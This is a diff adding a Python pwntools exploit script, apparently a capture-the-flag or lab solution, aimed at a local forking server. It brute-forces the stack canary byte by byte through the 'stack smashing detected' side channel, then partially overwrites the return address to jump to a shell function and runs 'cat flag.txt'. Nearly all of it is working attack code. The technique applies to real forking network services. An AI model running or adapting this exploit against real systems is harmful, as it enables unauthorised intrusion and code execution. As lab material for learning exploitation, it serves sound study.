@@ -1,0 +1,80 @@
+#!/usr/bin/env python3
+
+from time import sleep
+from pwn import *
+
+def start_server():
+    return subprocess.Popen(["./forkingserver"])
+
+def get_connection():
+    return remote("localhost", 6666)
+
+def int_to_byte(i):
+    return bytes([i])
+
+def main():
+
+    # disable logging
+    context.log_level = 'error'
+
+# we start by finding out the canary.
+# as shown in 'test.c', the canary of a function 
+# stays the same across multiple forks (which doesn't suprise).
+# we also use the fact that there may be two different responses of the server:
+# 1) "Server received 6 bytes\nDisconnected!"
+# 2) "Server received 6 bytes\n*** stack smashing detected ***: terminated"
+# therefore we have a sidechannel? and can start bruteforcing bit by bit
+
+    start_server()
+
+    canary = []
+    i = 0
+    while i < 8:
+        guess = 0
+        while True:
+            if guess >= 0xFF:
+                exit(0x00F)
+            io = get_connection()
+            preamble = io.recv()
+            # print(preamble)
+            injection = [b" "*72] + canary + [int_to_byte(guess)]
+            raw = b"".join(injection)
+            # print("sending: " + str(raw))
+            io.write(raw)
+            resp = io.recvuntil("cted")
+            io.close()
+            # print("receiving: " + str(resp))
+            if "stack smashing" not in resp.decode("utf-8"):
+                if "Disconnected" not in resp.decode("utf-8"):
+                    print("something went wrong with the files :/")
+                    exit(0xd00f)
+                canary.append(int_to_byte(guess))
+                # print("new canary: " + str(canary))
+                break
+            guess += 1
+        i += 1
+
+    # next we need to find out the addr of plsgivemeshell
+    # for testing purposes pls use no ASLR 
+    shell_addr = 0x555555555440
+    # thus we know the LS byte is 0x40
+    # and the next higher byte is 0x-4
+
+    for i in range(16):
+        guess = i*16+4
+        shell_addr_raw = struct.pack('<Q', shell_addr)
+        injection = [b" "*72] + canary + [b" "*8] + [b"\x40"] + [int_to_byte(guess)]
+        raw = b"".join(injection)
+        io = get_connection()
+        io.write(raw)
+        resp = io.recvuntil("\nServer received 90 bytes\n")
+        io.write("cat flag.txt\n")
+        try:
+            resp = io.recv()
+            print(resp.split()[0].decode("utf-8"))
+        except:
+            pass
+        io.close()  
+
+if __name__ == "__main__":
+    main()
